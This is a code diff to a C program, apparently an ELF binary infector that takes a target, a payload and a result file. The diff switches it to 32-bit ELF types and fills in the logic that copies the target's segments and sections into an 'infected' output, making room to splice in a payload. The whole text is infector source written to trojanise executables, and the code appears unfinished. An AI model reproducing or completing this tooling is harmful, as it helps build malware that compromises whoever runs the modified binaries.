@@ -9,7 +9,7 @@
 
 //what kind of elfs are we dealinth with yo?
 //yay polymorphism via macros!
-#define ELFN(x) Elf64_ ## x
+#define ELFN(x) Elf32_ ## x
 
 char usage[] = 
 "usage: %s target payload result\n\
@@ -29,7 +29,7 @@ int main(int argc, char *argv[]){
   off_t infectedSize;
   void *payload;
   off_t payloadSize;
-  int i;
+  int i, j;
   ELFN(Phdr) *programHeader;
   ELFN(Shdr) *sectionHeader;
 
@@ -62,7 +62,8 @@ int main(int argc, char *argv[]){
 
   //add a new entry in the program header table
   infectedElfHeader->e_phnum++;
-  infectedElfHeader->e_shoff = infectedSize - (infectedElfHeader->e_shnum*infectedElfHeader->e_shentsize); //adjust offset for the new header and payload
+  //place the section header table at the end of the binary
+  infectedElfHeader->e_shoff = infectedSize - (infectedElfHeader->e_shnum*infectedElfHeader->e_shentsize);
 
   //copy over the program header table
   ELFN(Phdr) *infectedProgramHeaderTable = infected + infectedElfHeader->e_phoff;
@@ -72,15 +73,59 @@ int main(int argc, char *argv[]){
   ELFN(Shdr) *infectedSectionHeaderTable = infected + infectedElfHeader->e_shoff;
   memcpy(infectedSectionHeaderTable, targetSectionHeaderTable, targetElfHeader->e_shnum*targetElfHeader->e_shentsize);
 
-  //TODO copy over each segment and section
+
+  //Copy over each segment and section
   //flags for which sections have been copied in a segment
   //0 is did not copy, 1 is did copy
-  char *copiedSections = calloc(targetElfHeader->e_shnum, 1);
-  for(i = 0, programHeader = targetProgramHeaderTable ;
+  char *copiedSections = calloc(infectedElfHeader->e_shnum, 1);
+  //start copying after the program header table
+  ELFN(Off) infectedStart = infectedElfHeader->e_phoff + infectedElfHeader->e_phnum*infectedElfHeader->e_phentsize;
+  for(i = 0, programHeader = infectedProgramHeaderTable ;
       i < targetElfHeader->e_phnum ;
       i++, programHeader++ ){
+
+    //record where it is located in the target
+    ELFN(Off) targetStart = programHeader->p_offset;
+    ELFN(Off) targetEnd   = targetStart + programHeader->p_filesz;
+
+    //copy it into the next location in the infected file
+    memcpy(infected + infectedStart, target + targetStart, programHeader->p_filesz);
+
+    //record it's new location
+    programHeader->p_offset = infectedStart;
+
+    //update the offsets of any sections we also just copied
+    for(j = 0, sectionHeader = infectedSectionHeaderTable ;
+        j < infectedElfHeader->e_shnum ;
+        j++, sectionHeader++ ){
+      //only bother checking if we haven't already got it
+      if( !copiedSections[j] ){
+        if( sectionHeader->sh_offset >= targetStart && sectionHeader->sh_offset <= targetEnd ){
+          sectionHeader->sh_offset = infectedStart + (sectionHeader->sh_offset - targetStart);
+          copiedSections[j] = 1;
+        }
+      }
+    }
+
+    infectedStart += programHeader->p_filesz; //increment infectedStart
   }
-   
+
+  //now copy over each remaining section
+  for(j = 0, sectionHeader = infectedSectionHeaderTable ;
+      j < infectedElfHeader->e_shnum ;
+      j++, sectionHeader++ ){
+    if( !copiedSections[j] && sectionHeader->sh_type!=SHT_NOBITS){
+      //copy it into the next location in the infected file
+      memcpy(infected + infectedStart, target + sectionHeader->sh_offset, sectionHeader->sh_size);
+      sectionHeader->sh_offset = infectedStart;
+      infectedStart += sectionHeader->sh_size;
+    }
+  }
+
+  free(copiedSections);
+
+
+
   infectedElfHeader->e_phnum--;
 
 
